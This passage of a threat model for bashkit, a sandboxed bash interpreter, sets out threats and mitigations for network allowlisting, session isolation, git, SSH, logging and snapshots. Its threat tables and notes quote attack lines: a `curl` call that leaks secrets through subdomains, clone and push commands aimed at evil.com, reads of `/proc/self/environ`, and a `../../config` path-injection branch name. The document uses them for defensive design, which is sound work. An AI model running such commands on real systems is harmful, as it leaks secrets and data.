A single IP address can host many domains (shared hosting, CDNs, cloud load balancers).
Blocking/allowing by IP is too coarse-grained.

**Why not an HTTP proxy?**
Proxies only work for HTTP traffic and require applications to be configured to use them
(or respect `HTTP_PROXY` env vars). They don't cover other TLS-based protocols like
database connections.

**Why literal host / SNI matching?**
SNI filtering inspects the `server_name` extension in the TLS client-hello, which the
client must send in cleartext before encryption begins. This works for all TLS traffic
regardless of protocol. Since bashkit controls the HTTP layer and provides no raw socket
access, literal host matching in the allowlist achieves equivalent coverage — every
outbound connection goes through the `HttpClient`, which checks the hostname against the
allowlist before any network I/O occurs.

**Domain allowlist vs URL patterns:**

The `allow_domain()` API provides a simpler interface when callers only need domain-level
control:

| Capability | `allow_domain()` | `allow()` (URL pattern) |
|------------|-------------------|-------------------------|
| Scheme enforcement | No (any scheme) | Yes (exact match) |
| Port enforcement | No (any port) | Yes (exact match) |
| Path restriction | No (any path) | Yes (prefix match) |
| Simplicity | High | Medium |

Callers requiring scheme or port enforcement should use URL patterns (`allow()`) instead
of domain rules. Both rule types can be combined on the same allowlist; a URL is permitted
if it matches **either** a domain rule or a URL pattern.

**Wildcard subdomains:**
Wildcard patterns (e.g., `*.example.com`) are deliberately **not supported**. They enable
data exfiltration by encoding secrets in subdomains: `curl https://$SECRET.example.com`.
Only exact domain matches are allowed (TM-NET-017).

---

### 6. Multi-Tenant Isolation

#### 6.1 Cross-Session Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-ISO-001 | Shared filesystem | Access other session's files | Separate Bash instances with separate FS | **MITIGATED** |
| TM-ISO-002 | Shared memory | Read other session's data | Rust memory safety, per-instance state | **MITIGATED** |
| TM-ISO-003 | Resource starvation | One session exhausts limits | Per-instance limits | **MITIGATED** |
| TM-ISO-004 | Cross-session env pollution via jq | `std::env::set_var()` in jq | Custom jaq global variable (`$__bashkit_env__`) | **MITIGATED** |
| TM-ISO-007 | Alias leakage | Aliases defined in session A visible in session B | Per-instance alias HashMap | **MITIGATED** |
| TM-ISO-008 | Trap handler leakage | Trap from session A fires in session B | Per-instance trap HashMap | **MITIGATED** |
| TM-ISO-009 | Shell option leakage | `set -e` in session A affects session B | Per-instance SHOPT_* variables | **MITIGATED** |
| TM-ISO-010 | Exported env var leakage | `export` in session A visible in session B | Per-instance env HashMap | **MITIGATED** |
| TM-ISO-011 | Array leakage | Indexed/associative arrays cross sessions | Per-instance array HashMaps | **MITIGATED** |
| TM-ISO-012 | Working directory leakage | `cd` in session A changes session B's cwd | Per-instance `cwd: PathBuf` | **MITIGATED** |
| TM-ISO-013 | Exit code leakage | `$?` from session A visible in session B | Per-instance `last_exit_code` | **MITIGATED** |
| TM-ISO-014 | Concurrent variable leakage | Race condition leaks vars between parallel sessions | Per-instance state, no shared mutables | **MITIGATED** |
| TM-ISO-015 | Concurrent FS leakage | Race condition leaks files between parallel sessions | Separate `Arc<FileSystem>` per instance | **MITIGATED** |
| TM-ISO-016 | Snapshot/restore side effects | `restore_shell_state()` affects other sessions | Snapshot is per-instance, no shared state | **MITIGATED** |
| TM-ISO-017 | Adversarial variable probing | Script enumerates common secret var names | Default-empty env, no host env inheritance | **MITIGATED** |
| TM-ISO-018 | /proc /sys probing | Script reads `/proc/self/environ` etc. | VFS has no real /proc or /etc | **MITIGATED** |
| TM-ISO-019 | jq cross-session env | `jq 'env.X'` sees other session's vars | jaq reads from injected global, not `std::env` | **MITIGATED** |
| TM-ISO-020 | Subshell mutation leakage | Subshell vars leak to parent or sibling sessions | Snapshot/restore in subshell + per-instance state | **MITIGATED** |

| TM-ISO-004 | Cross-session env pollution via jq | `std::env::set_var()` in jq modifies process-wide env, visible to concurrent sessions | Custom `$__bashkit_env__` jaq context variable replaces `std::env` access | **FIXED** |
| TM-ISO-005 | Session-level cumulative counter bypass | Repeated `exec()` calls each reset `ExecutionCounters`, giving unbounded aggregate resources | `SessionLimits` (`limits.rs`) caps cumulative commands and `exec()` call count across the lifetime of a `Bash` instance; counters are preserved across `reset_transient_state()` | **MITIGATED** |
| TM-ISO-006 | No per-instance variable/memory budget | Unbounded `HashMap` growth in variables, arrays, functions exhausts process memory | `MemoryLimits` (`limits.rs`) caps `max_variable_count`, `max_total_variable_bytes`, `max_array_entries`, `max_function_count`, and `max_function_body_bytes` per instance | **MITIGATED** |
| TM-ISO-021 | EXIT trap leaks across `exec()` calls | EXIT trap set in one `exec()` fires in subsequent `exec()` calls on same Bash instance | `reset_transient_state()` clears `traps` at the start of every `exec()` | **MITIGATED** |
| TM-ISO-022 | `$?` leaks across `exec()` calls | Exit code from one `exec()` visible as `$?` in next `exec()` instead of resetting to 0 | `reset_transient_state()` zeroes `last_exit_code` at the start of every `exec()` | **MITIGATED** |
| TM-ISO-023 | `set -e` leaks across `exec()` calls | `set` options (`-e`, `-x`, etc.) persist across `exec()` calls, causing unexpected abort behavior | `reset_transient_state()` clears `SET_OPTION_VARS` | **FIXED** |
| TM-ISO-024 | `$?` leaks into VFS subprocess | Parent `last_exit_code` visible inside VFS script subprocess, causing false `set -e` failures | `execute_script_content()` sets `last_exit_code = 0`, clears `nounset_error`, and clears `traps` for the child | **MITIGATED** |

**TM-ISO-004**: Fixed. The jq builtin now injects shell variables via a custom jaq context variable
(`$__bashkit_env__`) and overrides the `env` filter to read from it instead of `std::env`.
See `builtins/jq/compat.rs` and `builtins/jq/mod.rs` (env wiring).

**TM-ISO-005**: `ExecutionCounters::reset_for_execution()` zeros all counters at each `exec()` entry.
A tenant splitting work across many `exec()` calls gets unlimited aggregate commands, loop iterations,
and CPU time. Fix: add session-level cumulative counters that persist across `exec()` calls within a
`Bash` instance. See issue #655.

**TM-ISO-006**: Interpreter stores state in unbounded `HashMap` collections (`variables`, `arrays`,
`assoc_arrays`, `functions`). A script can create millions of entries, consuming arbitrary heap memory
and OOM-ing the process. Fix: add `MemoryLimits` with caps on variable count, total bytes, array
entries, and function count/size. See issue #656.

**Note**: `PROC_SUB_COUNTER` (`AtomicU64`) is a global monotonic counter for process substitution
paths (`/dev/fd/proc_sub_N`). This is a minor timing side-channel (reveals approximate execution
ordering across concurrent sessions) but does not leak data since paths are resolved within each
session's isolated VFS.

**Current Risk**: MEDIUM - cumulative resource bypass (TM-ISO-005) and memory exhaustion (TM-ISO-006)

**Implementation**: Each session gets separate instance with isolated state:
```rust
// Each session gets isolated instance (TM-ISO-001 through TM-ISO-020)
let session_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))
    .limits(session_limits)
    .build();

let session_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate FS
    .limits(session_limits)
    .build();
```

---

### 7. Internal Error Handling

#### 7.1 Panic Recovery

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INT-001 | Builtin panic crash | Invalid input triggers panic in builtin | `catch_unwind` wrapper on all builtins | **MITIGATED** |
| TM-INT-002 | Panic info leak | Panic message reveals sensitive data | Sanitized error messages (no panic details) | **MITIGATED** |
| TM-INT-003 | Date format panic | Invalid strftime format causes chrono panic | Pre-validation with `StrftimeItems` | **MITIGATED** |
| TM-INT-007 | `/dev/urandom` empty with `head -c` | `head -c 16 /dev/urandom` returns empty output; pipe from virtual device to builtin loses data | `read_file_for_builtin` (`builtins/mod.rs`) reads `/dev/urandom`/`/dev/random` as Latin-1 chars (each byte 0x00-0xFF maps 1:1 to a char) so `head -c N` returns N bytes of randomness in both the path-argument form and the `cat /dev/urandom \| head -c N` pipe form | **MITIGATED** |

**Current Risk**: LOW - All builtin panics are caught and converted to sanitized errors

**Implementation**: `interpreter/mod.rs` - Panic catching for all builtins:
```rust
// THREAT[TM-INT-001]: Builtins may panic on unexpected input
let result = AssertUnwindSafe(builtin.execute(ctx)).catch_unwind().await;

match result {
    Ok(Ok(exec_result)) => exec_result,
    Ok(Err(e)) => return Err(e),
    Err(_panic) => {
        // THREAT[TM-INT-002]: Panic message may contain sensitive info
        // Return sanitized error - never expose panic details
        ExecResult::err(format!("bash: {}: builtin failed unexpectedly\n", name), 1)
    }
}
```

**Date Format Validation** (TM-INT-003): `builtins/date.rs`
```rust
// THREAT[TM-INT-003]: chrono::format() can panic on invalid format specifiers
fn validate_format(format: &str) -> Result<(), String> {
    for item in StrftimeItems::new(format) {
        if let Item::Error = item {
            return Err(format!("invalid format string: '{}'", format));
        }
    }
    Ok(())
}
```

#### 7.2 Error Message Safety

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INT-004 | Path leak in errors | Error shows real filesystem paths | Virtual paths only in messages | **MITIGATED** |
| TM-INT-005 | Memory addr in errors | Debug output shows addresses | Display impl hides addresses | **MITIGATED** |
| TM-INT-006 | Stack trace exposure | Panic unwinds show call stack | `catch_unwind` prevents propagation | **MITIGATED** |

**Error Type Design**: `error.rs`
- All error messages are designed for end-user display
- `Internal` error variant for unexpected failures (never includes panic details)
- Error types implement Display without exposing internals

---

### 8. Git Security

Bashkit provides optional virtual git operations via the `git` feature. This section documents
security threats related to git operations and their mitigations.

#### 8.1 Repository Access

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-001 | Unauthorized clone | `git clone https://evil.com/repo` | Remote URL allowlist (Phase 2) | **PLANNED** |
| TM-GIT-002 | Host identity leak | Commit reveals real name/email | Configurable virtual identity | **MITIGATED** |
| TM-GIT-003 | Host git config access | Read ~/.gitconfig | No host filesystem access | **MITIGATED** |
| TM-GIT-004 | Credential theft | Access git credential store | No host filesystem access | **MITIGATED** |
| TM-GIT-005 | Repository escape | `git clone` outside VFS | All paths in VFS | **MITIGATED** |

**Current Risk**: LOW - All git operations confined to virtual filesystem

**Implementation**: `git/client.rs`
```rust
// THREAT[TM-GIT-002]: Host identity leak
// Author identity is configurable, never reads from host ~/.gitconfig
let config = format!(
    "[user]\n\tname = {}\n\temail = {}\n",
    self.config.author_name, self.config.author_email
);
```

#### 8.2 Git-specific DoS

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-006 | Large repo clone | Clone huge repository | FS size limits + response limit (Phase 2) | **PLANNED** |
| TM-GIT-007 | Many git objects | Create millions of git objects | `max_file_count` FS limit | **MITIGATED** |
| TM-GIT-008 | Deep history | Very long commit history | Log limit parameter | **MITIGATED** |
| TM-GIT-009 | Large pack files | Huge .git/objects/pack | `max_file_size` FS limit | **MITIGATED** |

**Current Risk**: LOW - Filesystem limits apply to all git operations

#### 8.3 Remote Operations (Phase 2)

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-GIT-010 | Push to unauthorized remote | `git push evil.com` | Remote URL allowlist | **PLANNED** |
| TM-GIT-011 | Fetch from unauthorized remote | `git fetch evil.com` | Remote URL allowlist | **PLANNED** |
| TM-GIT-012 | SSH key access | Use host SSH keys | HTTPS only (no SSH) | **PLANNED** |
| TM-GIT-013 | Git protocol bypass | Use git:// protocol | HTTPS only | **PLANNED** |

| TM-GIT-014 | Branch name path injection | `branch_create(name="../../config")` overwrites `.git/config` via `Path::join()` | `git/client.rs::validate_ref_name` rejects refs containing `..`, leading `/`, control chars, or other path-injection patterns before any `Path::join` | **MITIGATED** |

**TM-GIT-014**: Branch names are used directly in `Path::join()` (`git/client.rs:1035, 1080, 1119`)
without validation. A name like `../../config` can overwrite `.git/config` within the VFS. While
confined to VFS, this can corrupt the virtual git repository. Fix: validate branch names against
git's ref name rules (no `..`, no control chars, no trailing `.lock`).

**Current Risk**: LOW for remote ops (not yet implemented); MEDIUM for local git name injection

---

### 8.5 SSH Security

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-SSH-001 | Unauthorized host access | Connect to arbitrary hosts | Host allowlist (default-deny) | **MITIGATED** |
| TM-SSH-002 | Credential leakage | Read host `~/.ssh/` keys | Keys from VFS only | **MITIGATED** |
| TM-SSH-003 | Session exhaustion | Open many concurrent sessions | Max concurrent sessions limit | **MITIGATED** |
| TM-SSH-004 | OOM via large response | Server sends huge output | Streaming size limit | **MITIGATED** |
| TM-SSH-005 | Connection hang | Server never responds | Configurable timeout | **MITIGATED** |
| TM-SSH-006 | MITM via unverified host key | Attacker intercepts SSH connection | Strict host key checking (default: on) | **MITIGATED** |
| TM-SSH-007 | Non-standard port access | Connect to services on unexpected ports | Port allowlist | **MITIGATED** |
| TM-SSH-008 | Remote command injection | Inject via remote path in SCP | Shell-escape remote paths | **MITIGATED** |

**TM-SSH-006**: The `RusshHandler` verifies server host keys against trusted keys configured via
`SshConfig::trusted_host_key()`. When `strict_host_key_checking` is enabled (default), connections
to hosts without a matching trusted key are rejected. When disabled, a warning is emitted to stderr.

---

### 9. Logging Security

Bashkit provides optional structured logging via the `logging` feature. This section documents
security threats related to logging and their mitigations.

#### 9.1 Sensitive Data Leakage

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-001 | Secrets in logs | Log env vars containing passwords/tokens | LogConfig redaction | **MITIGATED** |
| TM-LOG-002 | Script content leak | Log full scripts containing embedded secrets | Script content disabled by default | **MITIGATED** |
| TM-LOG-003 | URL credential leak | Log URLs with `user:pass@host` | URL credential redaction | **MITIGATED** |
| TM-LOG-004 | API key detection | Log values that look like API keys/JWTs | Entropy-based detection | **MITIGATED** |

**Current Risk**: LOW - Sensitive data is redacted by default

**Implementation**: `logging.rs` provides `LogConfig` with redaction:
```rust
// Default configuration redacts sensitive data (TM-LOG-001 to TM-LOG-004)
let config = LogConfig::new();

// Redacts env vars matching: PASSWORD, SECRET, TOKEN, KEY, etc.
assert!(config.should_redact_env("DATABASE_PASSWORD"));

// Redacts URL credentials
assert_eq!(
    config.redact_url("https://user:pass@host.com"),
    "https://[REDACTED]@host.com"
);

// Detects API keys and JWTs
assert_eq!(config.redact_value("sk-1234567890abcdef"), "[REDACTED]");
```

**Caller Warning**: Using `LogConfig::unsafe_disable_redaction()` or
`LogConfig::unsafe_log_scripts()` may expose sensitive data in logs.

#### 9.2 Log Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-005 | Newline injection | Script contains `\n[ERROR] fake` | Newline escaping | **MITIGATED** |
| TM-LOG-006 | Control char injection | ANSI escape sequences in logs | Control char filtering | **MITIGATED** |

**Current Risk**: LOW - Log content is sanitized

**Implementation**: `logging::sanitize_for_log()` escapes dangerous characters:
```rust
// TM-LOG-005: Newlines escaped to prevent fake log entries
let input = "normal\n[ERROR] injected";
let sanitized = sanitize_for_log(input);
// Result: "normal\\n[ERROR] injected"
```

#### 9.3 Log Volume Attacks

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-LOG-007 | Log flooding | Script generates excessive output → many logs | Value truncation | **MITIGATED** |
| TM-LOG-008 | Large value DoS | Log very long strings | `max_value_length` limit (200) | **MITIGATED** |

**Current Risk**: LOW - Log values are truncated

**Implementation**: `LogConfig` limits value lengths:
```rust
// TM-LOG-008: Values truncated to prevent memory exhaustion
let config = LogConfig::new().max_value_length(200);
let long_value = "a".repeat(1000);
let truncated = config.truncate(&long_value);
// Result: "aaa...[truncated 800 bytes]"
```

#### 9.4 Logging Security Configuration

**Secure Defaults** (TM-LOG-001 to TM-LOG-008):
```rust
let config = LogConfig::new();
// - redact_sensitive: true (default)
// - log_script_content: false (default)
// - log_file_contents: false (default)
// - max_value_length: 200 (default)
```

**Custom Redaction Patterns**:
```rust
// Add custom env var patterns to redact
let config = LogConfig::new()
    .redact_env("MY_CUSTOM_SECRET")
    .redact_env("INTERNAL_TOKEN");
```

### 9.5 Snapshot Security

| ID | Threat | Attack | Mitigation | Status |
|----|--------|--------|------------|--------|
| TM-SNAP-001 | Snapshot forgery via public tag | Attacker computes valid SHA-256 digest using public `BKSNAP01` tag | Document limitation; add keyed HMAC API (`to_bytes_keyed`/`from_bytes_keyed`) | **MITIGATED** |

**`from_bytes`** uses `SHA-256(BKSNAP01 || payload)` where the tag is a public constant.
This detects accidental corruption but **does NOT prevent intentional forgery**. Any caller
with source code access can forge valid snapshots.

**`from_bytes_keyed`** uses `HMAC-SHA256(secret_key, payload)` with a caller-provided key.
Use this when snapshots cross trust boundaries (network transfer, shared storage, untrusted
input). The keyed API was added in response to issue #1167.

### 10. Builtin-Specific Threat Coverage

This section documents the security assessment of builtins that do not have individual
TM entries because their risk is fully covered by existing controls or is inherently low.

#### 10.1 Pure Computation Builtins (No Additional Risk)

These builtins operate on in-memory data with no resource access beyond what the
interpreter already controls. Their risk is bounded by existing limits (input size,
command count, timeout, `catch_unwind`).

| Builtin | Function | Why Low Risk |
|---------|----------|-------------|
| `base64` | Encode/decode base64 | Pure byte transformation; output bounded by input size |
| `md5sum`, `sha1sum`, `sha256sum` | Compute checksums | Hash computation on VFS file data; O(n) CPU, bounded by `max_file_size` |
| `verify` | Compute/verify file hashes | Same as checksum builtins; reads VFS files only |
| `iconv` | Encoding conversion | Pure byte transformation between UTF-8/ASCII/Latin1/UTF-16 |
| `hextools` (`od`, `xxd`, `hexdump`) | Byte-level inspection | Format VFS file bytes as hex/octal; output bounded by input size |
| `semver` | Version string parsing | Pure string comparison; no recursion or resource access |
| `strings` | Extract printable strings | Linear scan of byte data; output bounded by input |
| `fc` | History listing | Lists virtual session history; no re-execution in VFS environment |
| `log` | Structured logging output | Formats message to stdout; reads `LOG_LEVEL`/`LOG_FORMAT` from env (caller-controlled) |
| `parallel` | GNU parallel stub (dry-run only) | Reports planned commands; does not actually execute them in VFS |
| `retry` | Retry stub (dry-run only) | Reports planned retry config; does not actually re-execute in VFS |
| `inspect` (`less`, `file`, `stat`) | File inspection | Reads VFS files; bounded by `max_file_size`; `less` acts as `cat` |

#### 10.2 VFS-Bounded Builtins (Covered by FS Limits)

These builtins read/write VFS files. Their resource consumption is bounded by existing
filesystem limits (`max_file_size`, `max_file_count`, `max_total_bytes`).

| Builtin | Function | Covering Controls |
|---------|----------|-------------------|
| `patch` | Apply unified diffs to VFS files | VFS path normalization (TM-ESC-001), FS limits (TM-DOS-005/006) |
| `zip` | Create BKZIP archives in VFS | FS limits (TM-DOS-005); archive size bounded by `max_file_size` |
| `split` | Split file into pieces | FS limits (TM-DOS-006 `max_file_count`); see TM-DOS-055 |
| `csv` | Parse/query CSV data | Input bounded by `max_file_size`; linear parsing |
| `tomlq` | Query TOML data | Input bounded by `max_file_size`; TOML structure typically shallow |
| `dotenv` | Load .env files | VFS read; variable injection risk covered by TM-INJ-018 |

#### 10.3 Pattern Matching Builtins (Regex/Glob Risk)

| Builtin | Function | Covering Controls |
|---------|----------|-------------------|
| `rg` | Recursive grep (ripgrep-like) | Uses `regex` crate with internal backtrack limits (TM-DOS-025); VFS-only search |
| `glob` | Glob pattern matching | Uses `glob_match` — inherits ExtGlob blowup risk (TM-DOS-031, TM-DOS-054) |

#### 10.4 Builtins with Specific Threat Entries

| Builtin | Threat IDs | Summary |
|---------|------------|---------|
| `yaml` | TM-DOS-051 | Unbounded recursion in custom YAML parser |
| `template` | TM-DOS-052, TM-DOS-053, TM-INF-020 | Recursive rendering; env var exposure |
| `json` | (covered by serde_json) | Uses serde_json with 128-level recursion limit; no custom parser recursion risk |
| `unzip` | TM-INJ-017 | Path traversal in archive entry names |
| `dotenv` | TM-INJ-018 | Internal variable prefix injection |
| `envsubst` | TM-INF-019 | Env var exposure via substitution (caller risk) |
| `timeout` | (covered by existing limits) | Caps timeout at 300s (`MAX_TIMEOUT_SECONDS`); within execution timeout (TM-DOS-023) |

---

## Vulnerability Summary

This section maps former vulnerability IDs to the new threat ID scheme and tracks status.

### Mitigated (Previously Critical/High)

| Old ID | Threat ID | Vulnerability | Status |
|--------|-----------|---------------|--------|
| V1 | TM-DOS-001 | Large script input | **MITIGATED** via `max_input_bytes` |
| V2 | TM-DOS-002 | Output flooding | **MITIGATED** via command limits |
| V3 | TM-DOS-024 | Parser hang | **MITIGATED** via `parser_timeout` + `max_parser_operations` |
| V4 | TM-DOS-022 | Parser recursion | **MITIGATED** via `max_ast_depth` |
| V5 | TM-DOS-018 | Nested loop multiplication | **MITIGATED** via `max_total_loop_iterations` (1M) |
| V6 | TM-DOS-021 | Command sub parser limit bypass | **MITIGATED** via inherited depth/fuel |
| V7 | TM-DOS-026 | Arithmetic recursion overflow | **MITIGATED** via `MAX_ARITHMETIC_DEPTH` (50) |

### Open (Critical - Blocks Production)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| ~~TM-DOS-029~~ | ~~Arithmetic overflow/panic~~ | ~~Interpreter crash/hang~~ | ~~Use wrapping arithmetic, clamp shift/exponent~~ (**FIXED**) |
| ~~TM-ESC-012~~ | ~~VFS limit bypass via add_file()/restore()~~ | ~~Unlimited VFS writes~~ | ~~Add limit checks or restrict visibility~~ — `validate_path` + `check_write_limits` now run on both paths (**FIXED**) |
| ~~TM-INJ-009~~ | ~~Internal variable namespace injection~~ | ~~Bypass readonly, manipulate interpreter~~ | ~~Separate internal state HashMap~~ — `is_internal_variable()` check on every write path (**FIXED**) |
| ~~TM-INJ-012–015~~ | ~~Builtin bypass of is_internal_variable()~~ | ~~Unauthorized nameref/case attr injection via declare/readonly/local/export~~ | ~~Add is_internal_variable() check to all builtin insert paths~~ (**FIXED**) |
| ~~TM-DOS-043~~ | ~~Arithmetic panic in compound assignment~~ | ~~Process crash (DoS) in debug mode~~ | ~~wrapping_* ops in execute_arithmetic_with_side_effects~~ (**FIXED**) |
| ~~TM-DOS-044~~ | ~~Lexer stack overflow on nested $()~~ | ~~Process crash (SIGABRT)~~ | ~~Depth tracking in read_command_subst_into~~ — bounded; nested-subst tests pass at depth 50 (**FIXED**) |

### Open (High Priority)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| ~~TM-DOS-031~~ | ~~ExtGlob exponential blowup~~ | ~~CPU exhaustion / stack overflow~~ | ~~Add fuel counter to glob_match_impl~~ — recursion-depth cap in `glob_match_impl` (**FIXED**) |
| ~~TM-DOS-041~~ | ~~Brace expansion unbounded range~~ | ~~OOM DoS~~ | ~~Cap range size in try_expand_range()~~ (**FIXED**) |
| ~~TM-DOS-032~~ | ~~Tokio runtime per sync call (Python)~~ | ~~OS thread/fd exhaustion~~ | ~~Shared runtime~~ — `Arc<Runtime>` per `PyBash`/`BashTool` instance (**FIXED**) |
| ~~TM-PY-023~~ | ~~Shell injection in deepagents.py~~ | ~~Command injection within VFS~~ | ~~Use shlex.quote() or direct API~~ — `shlex.quote` on every interpolated path (**FIXED**) |
| ~~TM-PY-024~~ | ~~Heredoc content injection in write()~~ | ~~Command injection within VFS~~ | ~~Random delimiter or direct API~~ — `BASHKIT_EOF_<token_hex(8)>` per call (**FIXED**) |
| ~~TM-PY-025~~ | ~~GIL deadlock in execute_sync~~ | ~~Python process deadlock~~ | ~~py.allow_threads()~~ — every `rt.block_on` in lib.rs now releases the GIL via `Python::allow_threads` (**FIXED**) |
| TM-ISO-004 | ~~Cross-session env pollution via jq~~ | ~~Session isolation breach~~ | ~~Same fix as TM-INF-013~~ (**FIXED**) |
| ~~TM-ESC-013~~ | ~~OverlayFs upper() exposes unlimited FS~~ | ~~VFS limit bypass~~ | ~~Restrict upper() visibility~~ — upper now mirrors overlay limits (**FIXED**) |

### Open (Medium Priority)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| ~~TM-DOS-051~~ | ~~YAML parser unbounded recursion~~ | ~~Stack overflow on deeply nested YAML~~ | ~~Add depth parameter to parse_yaml_block/map/list~~ — `depth` arg + `MAX_YAML_DEPTH = 100` cap (**FIXED**) |
| ~~TM-DOS-052~~ | ~~Template engine unbounded recursion~~ | ~~Stack overflow on deeply nested templates~~ | ~~Add depth parameter to render_template~~ — `depth` arg + `MAX_TEMPLATE_DEPTH = 100` cap (**FIXED**) |
| ~~TM-DOS-054~~ | ~~`glob --files` ExtGlob blowup~~ | ~~CPU exhaustion (same as TM-DOS-031)~~ | ~~Fix TM-DOS-031 covers this~~ (**FIXED**) |
| ~~TM-INJ-017~~ | ~~Unzip path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | ~~Validate paths stay within extract_base~~ — `validate_extract_entry_path` rejects non-`Normal` components (**FIXED**) |
| ~~TM-INJ-018~~ | ~~Dotenv internal variable injection~~ | ~~Bypass readonly, manipulate interpreter~~ | ~~Add is_internal_variable() check~~ — `Dotenv::execute` skips internal-prefix keys (**FIXED**) |
| TM-INF-001 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
| TM-INJ-008 | Terminal escapes in output | UI manipulation | Document sanitization need |
| ~~TM-INJ-010~~ | ~~Tar path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | ~~Validate paths stay within extract_base~~ — archive.rs rejects entries that don't `starts_with(&extract_base)` (**FIXED**) |
| ~~TM-GIT-014~~ | ~~Git branch name path injection~~ | ~~VFS git repo corruption~~ | ~~Validate branch names~~ — `validate_ref_name` in `git/client.rs` (**FIXED**) |
| TM-INF-014 | Real PID leak via $$ | Host information disclosure | Return virtual PID |
| ~~TM-INF-015~~ | ~~URL credentials in error messages~~ | ~~Credential leak~~ | ~~Apply URL redaction~~ — `network/allowlist.rs::redact_url` (**FIXED**) |
| TM-INF-016 | Internal state in error messages | Info leak (paths, IPs, TLS) | Consistent Display format |
| TM-DOS-034 | ~~TOCTOU in append_file~~ | ~~VFS size limit bypass~~ | ~~Single write lock~~ (**FIXED**) |
| ~~TM-ISO-005~~ | ~~Session-level cumulative counter bypass~~ | ~~Unbounded aggregate resources across exec() calls~~ | ~~Session-level counters~~ — `SessionLimits` struct (**FIXED**) |
| ~~TM-ISO-006~~ | ~~No per-instance variable/memory budget~~ | ~~Process OOM via unbounded HashMap growth~~ | ~~MemoryLimits struct~~ — `MemoryLimits` struct (**FIXED**) |
| ~~TM-DOS-035~~ | ~~OverlayFs limit check upper-only~~ | ~~Combined size limit bypass~~ | ~~Use compute_usage()~~ (**FIXED**) |
| ~~TM-DOS-036~~ | ~~OverlayFs usage double-count~~ | ~~Premature limit rejections~~ | ~~Subtract overrides~~ (**FIXED**) |
| ~~TM-DOS-037~~ | ~~OverlayFs chmod CoW bypass~~ | ~~Limit bypass via chmod~~ | ~~Route through check_write_limits~~ (**FIXED**) |
| ~~TM-DOS-038~~ | ~~OverlayFs incomplete whiteout~~ | ~~Deleted files remain visible~~ | ~~Check ancestor whiteouts~~ (**FIXED**) |
| ~~TM-DOS-039~~ | ~~Missing validate_path in VFS~~ | ~~Path validation gaps~~ | ~~Add to all methods~~ — `validate_path()` in every InMemoryFs / OverlayFs / MountableFs method (**FIXED**) |
| TM-ESC-014 | ~~Custom builtins lost after first call~~ | ~~Security wrappers silently removed~~ | ~~Clone or Arc builtins~~ (**FIXED**) |
| ~~TM-PY-026~~ | ~~reset() discards security config~~ | ~~DoS protections removed~~ | ~~Preserve config on reset~~ — `PyBash::reset` and `BashTool::reset` rebuild via `replace_live_bash_with_builder` (**FIXED**) |
| ~~TM-INJ-011~~ | ~~Cyclic nameref silent resolution~~ | ~~Read/write unintended variables~~ | ~~Detect cycles, error~~ — `resolve_nameref()` detects cycles via visited-set and returns original name (**FIXED**) |
| ~~TM-PY-027~~ | ~~py_to_json unbounded recursion~~ | ~~Stack overflow~~ | ~~Add depth counter~~ — `MAX_NESTING_DEPTH = 64` enforced in `json_to_py_inner` / `py_to_json_inner` / MontyObject converters (**FIXED**) |
| ~~TM-DOS-040~~ | ~~Integer truncation on 32-bit~~ | ~~Size check bypass~~ | ~~Use try_from()~~ — `usize::try_from(...).unwrap_or(usize::MAX)` (**FIXED**) |
| TM-UNI-001 | Awk parser byte-boundary panic on Unicode | Silent builtin failure on valid input | Fix awk parser to use char-boundary-safe indexing |
| TM-UNI-002 | Sed parser byte-boundary issues | Silent builtin failure on valid input | Audit and fix sed byte-indexing |
| ~~TM-UNI-003~~ | ~~Zero-width chars in filenames~~ | ~~Invisible/confusable filenames~~ | ~~Extend `find_unsafe_path_char()`~~ (**FIXED**) |
| ~~TM-UNI-011~~ | ~~Tag characters in filenames~~ | ~~Invisible content in filenames~~ | ~~Extend `find_unsafe_path_char()`~~ (**FIXED**) |
| TM-UNI-015 | Expr `substr` byte-boundary panic | Silent failure on multi-byte substr | Fix to use char-boundary-safe indexing (issue #434) |
| TM-UNI-016 | Printf precision mid-char panic | Silent failure on multi-byte precision truncation | Use `is_char_boundary()` before slicing (issue #435) |
| TM-UNI-017 | Cut/tr byte-level char set parsing | Multi-byte chars silently dropped in tr specs | Switch from `as_bytes()` to char iteration (issue #436) |
| TM-UNI-018 | Interpreter arithmetic byte/char confusion | Wrong operator detection on multi-byte expressions | Use `char_indices()` instead of `.find()` + `.chars().nth()` (issue #437) |
| TM-UNI-019 | Network allowlist byte/char confusion | Wrong path boundary check on multi-byte URLs | Use byte offset consistently in URL matching (issue #438) |

### Open (From 2026-03 Deep Audit — New Findings)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| ~~TM-INJ-012~~ | ~~`declare` bypasses `is_internal_variable()`~~ | ~~Unauthorized nameref creation, case conversion injection~~ | ~~Route declare assignments through `set_variable()` or add `is_internal_variable()` check~~ (**FIXED**) |
| ~~TM-INJ-013~~ | ~~`readonly` bypasses `is_internal_variable()`~~ | ~~Unauthorized nameref creation via `readonly _NAMEREF_x=target`~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
| ~~TM-INJ-014~~ | ~~`local` bypasses `is_internal_variable()`~~ | ~~Internal prefix injection in function scope~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
